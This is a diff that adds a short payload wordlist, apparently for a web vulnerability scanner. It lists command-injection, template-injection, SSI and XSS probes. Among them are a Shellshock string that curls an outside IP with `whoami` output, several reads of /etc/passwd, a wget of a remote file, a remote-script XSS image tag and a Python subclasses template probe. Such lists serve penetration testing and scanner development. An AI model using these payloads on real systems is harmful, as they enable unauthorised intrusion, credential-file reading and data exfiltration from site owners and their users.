@@ -1,0 +1,17 @@
+() { :;}; /bin/bash -c "curl http://135.23.158.130/.testing/shellshock.txt?vuln=16?user=\`whoami\`"
+cat /etc/hosts
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+system('cat /etc/passwd');
+<?php system("cat /etc/passwd");?>
+echo '<img src=https://crowdshield.com/.testing/xss.js onload=prompt(2) onerror=alert(3)></img>'// XXXXXXXXXXX
+eval('ls')
+eval('pwd')
+exec('echo XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+| ls -laR /etc
+perl -e 'print "X"x1024'
+phpinfo()
+system('wget https://xerosecurity.com/.testing/rce_vuln.txt');
+| uname -a
+{{ get_user_file("C:\boot.ini") }}
+{{[] .__ Class __.__ base __.__ subclasses __ ()}}
